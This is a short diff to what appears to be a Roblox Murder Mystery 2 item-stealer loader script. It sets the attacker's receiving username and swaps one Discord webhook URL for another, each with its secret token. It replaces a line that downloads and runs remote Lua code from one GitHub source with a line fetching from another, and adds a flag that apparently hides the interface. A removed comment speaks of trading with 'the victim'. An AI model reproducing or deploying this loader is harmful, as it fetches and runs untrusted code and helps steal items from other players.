@@ -1,5 +1,5 @@
+getgenv().gui = false
 Username = "tadash_10"
-Webhook = "https://discord.com/api/webhooks/1284860835973566505/MPLdQttCRetkQCZ8xtcVJcfpvazi5hhNBd-qnuMNXCMVxXNTosdbKNXaXE_GF7aGr5CN"
--- Send a message in chat to resend the trade request if you haven't receive it or if the victim trade nothing when you traded him.
+Webhook = "https://discord.com/api/webhooks/1284860834886975541/Scw_BgOMhZhYlUnPOh_BTxbvHLlkAOtmcWMyHDgrIaQoDXYmx1Uv8TawW_aoNIe_moFm"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/main/mm2/stealer"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/doslobodydoedy/x/main/main.lua"))()
